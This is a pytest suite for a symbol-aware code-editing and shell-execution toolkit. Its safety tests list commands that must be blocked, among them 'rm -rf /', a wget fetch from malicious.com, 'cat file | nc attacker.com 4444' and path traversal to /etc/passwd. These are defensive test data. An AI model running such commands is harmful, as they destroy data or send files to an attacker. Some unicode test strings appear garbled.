"""
Comprehensive test suite for code_editing_toolkit.py

Tests all public functions and helper functions for symbol-aware code editing.
Focuses on achieving 50%+ coverage with real-world scenarios.
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import patch, mock_open

import pytest

from lib.tools.shared.code_editing_toolkit import (
    replace_symbol_body,
    insert_before_symbol,
    insert_after_symbol,
    rename_symbol,
    execute_shell_command,
    validate_code_syntax,
    _is_safe_path,
    _is_safe_command,
    _create_backup,
    _find_symbol_definition,
    _find_symbol_line,
    _find_symbol_end,
    _get_line_indentation,
    _format_symbol_body,
    _format_code_block,
    _validate_python_syntax,
    _detect_language,
    _is_valid_identifier,
    _get_project_files,
    _smart_rename_symbol,
)


class TestSafetyValidation:
    """Test security and safety validation functions."""

    def test_is_safe_path_valid_relative_paths(self):
        """Test that valid relative paths are considered safe."""
        assert _is_safe_path("lib/utils/test.py")
        assert _is_safe_path("src/main.py")
        assert _is_safe_path("test.txt")
        assert _is_safe_path("subfolder/file.py")

    def test_is_safe_path_blocks_absolute_paths(self):
        """Test that absolute paths are blocked."""
        assert not _is_safe_path("/etc/passwd")
        assert not _is_safe_path("/home/user/file.py")
        assert not _is_safe_path("C:\\Windows\\System32\\file.exe")

    def test_is_safe_path_blocks_traversal(self):
        """Test that path traversal attempts are blocked."""
        assert not _is_safe_path("../../../etc/passwd")
        assert not _is_safe_path("lib/../../etc/passwd")
        assert not _is_safe_path("..\\..\\file.txt")

    def test_is_safe_command_allows_basic_commands(self):
        """Test that basic safe commands are allowed."""
        assert _is_safe_command("python script.py")
        assert _is_safe_command("ls -la")
        assert _is_safe_command("git status")
        assert _is_safe_command("pytest tests/")

    def test_is_safe_command_blocks_dangerous_commands(self):
        """Test that dangerous commands are blocked."""
        assert not _is_safe_command("rm -rf /")
        assert not _is_safe_command("sudo apt install package")
        assert not _is_safe_command("del important_file.txt")
        assert not _is_safe_command("chmod 777 file")
        assert not _is_safe_command("wget http://malicious.com/script.sh")
        assert not _is_safe_command("echo 'data' > file.txt")
        assert not _is_safe_command("cat file | nc attacker.com 4444")


class TestFileOperations:
    """Test file operation helper functions."""

    def test_create_backup_creates_timestamped_backup(self):
        """Test that backup creation works with timestamps."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test file
            test_file = Path(temp_dir) / "test.py"
            test_file.write_text("original content")
            
            # Create backup
            backup_path = _create_backup(test_file)
            
            # Verify backup exists and has correct content
            assert backup_path.exists()
            assert backup_path.read_text() == "original content"
            assert "backup_" in backup_path.name
            assert test_file.name in backup_path.name

    def test_detect_language_from_extensions(self):
        """Test language detection from file extensions."""
        assert _detect_language(Path("test.py")) == "python"
        assert _detect_language(Path("script.js")) == "javascript"
        assert _detect_language(Path("component.ts")) == "typescript"
        assert _detect_language(Path("Main.java")) == "java"
        assert _detect_language(Path("program.cpp")) == "cpp"
        assert _detect_language(Path("unknown.xyz")) == "unknown"

    def test_is_valid_identifier_validates_names(self):
        """Test identifier validation."""
        assert _is_valid_identifier("valid_name")
        assert _is_valid_identifier("CamelCase")
        assert _is_valid_identifier("snake_case_123")
        assert not _is_valid_identifier("123invalid")
        assert not _is_valid_identifier("with-dash")
        assert not _is_valid_identifier("__dunder__")
        assert not _is_valid_identifier("")


class TestCodeParsing:
    """Test code parsing and symbol detection functions."""

    def test_find_symbol_line_finds_functions(self):
        """Test finding function definitions."""
        content = """
def first_function():
    pass

def target_function(param):
    return param

def another_function():
    pass
        """
        line_num = _find_symbol_line(content, "target_function", "function")
        assert line_num == 4  # 0-based indexing

    def test_find_symbol_line_finds_classes(self):
        """Test finding class definitions."""
        content = """
import os

class TestClass:
    def method(self):
        pass

class AnotherClass:
    pass
        """
        line_num = _find_symbol_line(content, "TestClass", "class")
        assert line_num == 3

    def test_find_symbol_line_finds_variables(self):
        """Test finding variable assignments."""
        content = """
import sys
DEBUG = True
target_var = "test value"
OTHER_VAR = 123
        """
        line_num = _find_symbol_line(content, "target_var", "variable")
        assert line_num == 3

    def test_find_symbol_definition_returns_full_info(self):
        """Test finding complete symbol definition information."""
        content = """
class ExampleClass:
    def method(self):
        if True:
            return "nested"
        return "simple"
    
    def other_method(self):
        pass
        """
        symbol_info = _find_symbol_definition(content, "method", "function")
        
        assert symbol_info is not None
        assert symbol_info["start_line"] == 2
        assert symbol_info["signature_line"] == 2
        assert symbol_info["indentation"] == 4  # Inside class

    def test_find_symbol_end_calculates_correct_bounds(self):
        """Test finding the end of symbol blocks."""
        lines = [
            "def function():",
            "    line1 = 'test'",
            "    if True:",
            "        nested = 'value'",
            "    return line1",
            "",
            "def next_function():",
            "    pass",
        ]
        
        end_line = _find_symbol_end(lines, 0, 0)  # Start at line 0, base indent 0
        assert end_line == 4  # Should end at the return statement

    def test_get_line_indentation_counts_spaces(self):
        """Test indentation counting."""
        assert _get_line_indentation("no_indent") == 0
        assert _get_line_indentation("    four_spaces") == 4
        assert _get_line_indentation("        eight_spaces") == 8
        assert _get_line_indentation("\t\ttwo_tabs") == 2


class TestCodeFormatting:
    """Test code formatting and indentation functions."""

    def test_format_symbol_body_applies_correct_indentation(self):
        """Test symbol body formatting with proper indentation."""
        body = """line1 = 'test'
if condition:
    nested_line = 'nested'
return result"""
        
        formatted = _format_symbol_body(body, 4, "function")
        
        expected = [
            "        line1 = 'test'",
            "        if condition:",
            "            nested_line = 'nested'",
            "        return result"
        ]
        assert formatted == expected

    def test_format_code_block_maintains_relative_indentation(self):
        """Test code block formatting preserves internal structure."""
        code = """if True:
    nested = 'value'
    if nested:
        deeply_nested = 'deep'
return nested"""
        
        formatted = _format_code_block(code, 4)
        
        expected = [
            "    if True:",
            "        nested = 'value'",
            "        if nested:",
            "            deeply_nested = 'deep'",
            "    return nested"
        ]
        assert formatted == expected


class TestSyntaxValidation:
    """Test syntax validation functions."""

    def test_validate_python_syntax_valid_code(self):
        """Test Python syntax validation with valid code."""
        valid_code = """
def hello(name):
    return f"Hello, {name}!"

class Greeter:
    def greet(self, name):
        return hello(name)
        """
        
        result = _validate_python_syntax(valid_code)
        assert result["valid"] is True
        assert "stats" in result
        assert result["stats"]["functions"] == 2
        assert result["stats"]["classes"] == 1

    def test_validate_python_syntax_invalid_code(self):
        """Test Python syntax validation with invalid code."""
        invalid_code = """
def broken_function(:
    return "missing param name"
        """
        
        result = _validate_python_syntax(invalid_code)
        assert result["valid"] is False
        assert "error" in result
        assert "line_number" in result

    def test_validate_python_syntax_handles_exceptions(self):
        """Test handling of general validation exceptions."""
        # This should trigger a general exception, not SyntaxError
        result = _validate_python_syntax(None)
        assert result["valid"] is False
        assert "error" in result


class TestSymbolRenaming:
    """Test symbol renaming logic."""

    def test_smart_rename_symbol_function_calls(self):
        """Test renaming function calls with proper boundary detection."""
        content = """
old_function()
result = old_function(param1, param2)
not_old_function_call()
old_functionXsimilar()
        """
        
        new_content, count = _smart_rename_symbol(content, "old_function", "new_function", "function")
        
        assert count == 2
        assert "new_function()" in new_content
        assert "new_function(param1, param2)" in new_content
        assert "not_old_function_call()" in new_content  # Should not change
        assert "old_functionXsimilar()" in new_content  # Should not change

    def test_smart_rename_symbol_class_references(self):
        """Test renaming class references."""
        content = """
obj = OldClass()
class NewThing(OldClass):
    pass
result = OldClass.static_method()
        """
        
        new_content, count = _smart_rename_symbol(content, "OldClass", "NewClass", "class")
        
        assert count == 3
        assert "NewClass()" in new_content
        assert "NewClass):" in new_content
        assert "NewClass.static_method()" in new_content

    def test_smart_rename_symbol_variable_references(self):
        """Test renaming variable references."""
        content = """
old_var = 'value'
print(old_var)
old_variable_similar = 'other'
        """
        
        new_content, count = _smart_rename_symbol(content, "old_var", "new_var", "variable")
        
        assert count == 2
        assert "new_var = 'value'" in new_content
        assert "print(new_var)" in new_content
        assert "old_variable_similar" in new_content  # Should not change


class TestProjectFileOperations:
    """Test project-wide file operations."""

    def test_get_project_files_finds_relevant_files(self):
        """Test finding project files with correct filtering."""
        with tempfile.TemporaryDirectory() as temp_dir:
            project_root = Path(temp_dir)
            
            # Create test file structure
            (project_root / "src").mkdir()
            (project_root / "tests").mkdir()
            (project_root / ".git").mkdir()
            (project_root / "__pycache__").mkdir()
            
            # Create files
            (project_root / "main.py").write_text("# main")
            (project_root / "src" / "module.py").write_text("# module")
            (project_root / "tests" / "test_module.py").write_text("# test")
            (project_root / "README.md").write_text("# readme")
            (project_root / ".git" / "config").write_text("git config")
            (project_root / "__pycache__" / "cached.pyc").write_text("cached")
            
            files = _get_project_files(project_root)
            
            # Should find Python files but not git or cache files
            file_names = [f.name for f in files]
            assert "main.py" in file_names
            assert "module.py" in file_names
            assert "test_module.py" in file_names
            assert "config" not in file_names
            assert "cached.pyc" not in file_names


class TestToolsIntegration:
    """Test the main tool functions with integration scenarios."""

    def test_replace_symbol_body_with_temp_files(self):
        """Test replace_symbol_body with actual file operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Change to temp directory to simulate project root
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                # Create test file
                test_file = Path("test_module.py")
                test_content = """def old_function():
    old_line = 'old'
    return old_line

def other_function():
    return 'other'
"""
                test_file.write_text(test_content)
                
                # Replace function body
                new_body = """new_line = 'new'
if new_line:
    return new_line.upper()
return 'default'"""
                
                result = replace_symbol_body(
                    "test_module.py", 
                    "old_function", 
                    "function", 
                    new_body
                )
                
                assert "Successfully replaced body" in result
                
                # Verify content changed
                updated_content = test_file.read_text()
                assert "new_line = 'new'" in updated_content
                assert "old_line = 'old'" not in updated_content
                assert "def other_function():" in updated_content  # Other functions preserved
                
            finally:
                os.chdir(original_cwd)

    def test_insert_before_symbol_with_temp_files(self):
        """Test insert_before_symbol with actual file operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                test_file = Path("test_module.py")
                test_content = """import os

def target_function():
    return 'target'
"""
                test_file.write_text(test_content)
                
                new_code = """# This is a new comment
def helper_function():
    return 'helper'"""
                
                result = insert_before_symbol(
                    "test_module.py",
                    "target_function",
                    "function",
                    new_code
                )
                
                assert "Inserted" in result
                
                updated_content = test_file.read_text()
                assert "# This is a new comment" in updated_content
                assert "def helper_function():" in updated_content
                # Ensure insertion happened before target
                helper_pos = updated_content.find("def helper_function()")
                target_pos = updated_content.find("def target_function()")
                assert helper_pos < target_pos
                
            finally:
                os.chdir(original_cwd)

    def test_insert_after_symbol_with_temp_files(self):
        """Test insert_after_symbol with actual file operations."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                test_file = Path("test_module.py")
                test_content = """def main_function():
    return 'main'

def final_function():
    return 'final'
"""
                test_file.write_text(test_content)
                
                new_code = """def inserted_function():
    return 'inserted'"""
                
                result = insert_after_symbol(
                    "test_module.py",
                    "main_function",
                    "function",
                    new_code
                )
                
                assert "Inserted" in result
                
                updated_content = test_file.read_text()
                assert "def inserted_function():" in updated_content
                # Ensure insertion happened after main but before final
                main_end = updated_content.find("return 'main'")
                inserted_pos = updated_content.find("def inserted_function()")
                final_pos = updated_content.find("def final_function()")
                assert main_end < inserted_pos < final_pos
                
            finally:
                os.chdir(original_cwd)

    def test_validate_code_syntax_python_file(self):
        """Test syntax validation with actual Python file."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                # Valid Python file
                test_file = Path("valid.py")
                test_file.write_text("""
def greet(name):
    return f"Hello, {name}!"

class Greeter:
    def __init__(self, default_name="World"):
        self.default_name = default_name
    
    def greet(self, name=None):
        return greet(name or self.default_name)
""")
                
                result = validate_code_syntax("valid.py")
                assert "Syntax validation passed" in result
                assert "Python" in result
                
                # Invalid Python file
                invalid_file = Path("invalid.py")
                invalid_file.write_text("""
def broken_function(:  # Missing parameter name
    return "broken"
""")
                
                result = validate_code_syntax("invalid.py")
                assert "Syntax validation failed" in result
                assert "Error:" in result
                
            finally:
                os.chdir(original_cwd)


class TestErrorHandling:
    """Test error handling and edge cases."""

    def test_replace_symbol_body_file_not_found(self):
        """Test error handling when file doesn't exist."""
        result = replace_symbol_body(
            "nonexistent.py",
            "some_function", 
            "function",
            "new body"
        )
        assert "Error: File" in result
        assert "does not exist" in result

    def test_replace_symbol_body_symbol_not_found(self):
        """Test error handling when symbol doesn't exist."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                test_file = Path("test.py")
                test_file.write_text("def other_function(): pass")
                
                result = replace_symbol_body(
                    "test.py",
                    "nonexistent_function",
                    "function", 
                    "new body"
                )
                
                assert "Error: Symbol" in result
                assert "not found" in result
                
            finally:
                os.chdir(original_cwd)

    def test_replace_symbol_body_unsafe_path(self):
        """Test error handling for unsafe paths."""
        result = replace_symbol_body(
            "../../../etc/passwd",
            "function",
            "function",
            "malicious code"
        )
        assert "Error: Invalid or unsafe path" in result

    def test_execute_shell_command_unsafe_command(self):
        """Test error handling for unsafe commands."""
        result = execute_shell_command("rm -rf /")
        assert "Error: Potentially unsafe command blocked" in result

    def test_execute_shell_command_invalid_working_directory(self):
        """Test error handling for invalid working directory."""
        result = execute_shell_command(
            "ls",
            working_directory="nonexistent_directory"
        )
        assert "Error: Working directory does not exist" in result

    @patch('subprocess.run')
    def test_execute_shell_command_timeout(self, mock_run):
        """Test command timeout handling."""
        from subprocess import TimeoutExpired
        mock_run.side_effect = TimeoutExpired("test_cmd", 30)
        
        result = execute_shell_command("sleep 100", timeout=30)
        assert "Error: Command timed out" in result

    def test_rename_symbol_invalid_identifier(self):
        """Test error handling for invalid new identifiers."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                test_file = Path("test.py")
                test_file.write_text("def old_name(): pass")
                
                result = rename_symbol(
                    "test.py",
                    "old_name",
                    "123invalid",  # Invalid identifier
                    "function"
                )
                
                assert "Error:" in result
                assert "not a valid identifier" in result
                
            finally:
                os.chdir(original_cwd)


class TestShellExecution:
    """Test shell command execution functionality."""

    @patch('subprocess.run')
    def test_execute_shell_command_success(self, mock_run):
        """Test successful command execution."""
        # Mock successful command
        mock_run.return_value.returncode = 0
        mock_run.return_value.stdout = "Command output"
        mock_run.return_value.stderr = ""
        
        result = execute_shell_command("echo 'test'")
        
        assert "Command executed:" in result
        assert "Exit code: 0" in result
        assert "Command output" in result
        assert "Command completed successfully" in result

    @patch('subprocess.run')
    def test_execute_shell_command_failure(self, mock_run):
        """Test failed command execution."""
        # Mock failed command
        mock_run.return_value.returncode = 1
        mock_run.return_value.stdout = ""
        mock_run.return_value.stderr = "Error message"
        
        result = execute_shell_command("false")
        
        assert "Command executed:" in result
        assert "Exit code: 1" in result
        assert "Error message" in result
        assert "Command failed with exit code 1" in result


class TestEdgeCasesAndBoundaries:
    """Test edge cases and boundary conditions."""

    def test_empty_file_operations(self):
        """Test operations on empty files."""
        with tempfile.TemporaryDirectory() as temp_dir:
            original_cwd = os.getcwd()
            os.chdir(temp_dir)
            
            try:
                # Create empty file
                test_file = Path("empty.py")
                test_file.write_text("")
                
                # Try to find symbol in empty file
                result = replace_symbol_body(
                    "empty.py",
                    "function",
                    "function",
                    "body"
                )
                
                assert "Symbol" in result
                assert "not found" in result
                
            finally:
                os.chdir(original_cwd)

    def test_large_indentation_levels(self):
        """Test handling of deeply nested code."""
        content = """
class Outer:
    class Middle:
        class Inner:
            def deeply_nested(self):
                if True:
                    if True:
                        if True:
                            return 'deep'
        """
        
        symbol_info = _find_symbol_definition(content, "deeply_nested", "function")
        assert symbol_info is not None
        assert symbol_info["indentation"] == 12  # 3 levels of 4-space indentation

    def test_mixed_indentation_handling(self):
        """Test handling of mixed tabs and spaces."""
        lines_with_mixed_indentation = [
            "def function():",
            "\tline_with_tab = 'tab'",
            "    line_with_spaces = 'spaces'",
            "\t    mixed_line = 'mixed'",
            "    return mixed_line"
        ]
        
        # Should handle mixed indentation gracefully
        end_line = _find_symbol_end(lines_with_mixed_indentation, 0, 0)
        assert end_line == 4

    def test_unicode_content_handling(self):
        """Test handling of Unicode characters in code."""
        unicode_body = """# Comment with unicode: `}
message = "Hello L!"
emoji = "= Python"
return f"{message} {emoji}" """
        
        formatted = _format_symbol_body(unicode_body, 0, "function")
        
        # Should preserve Unicode characters
        assert any("`}" in line for line in formatted)
        assert any("L" in line for line in formatted) 
        assert any("=" in line for line in formatted)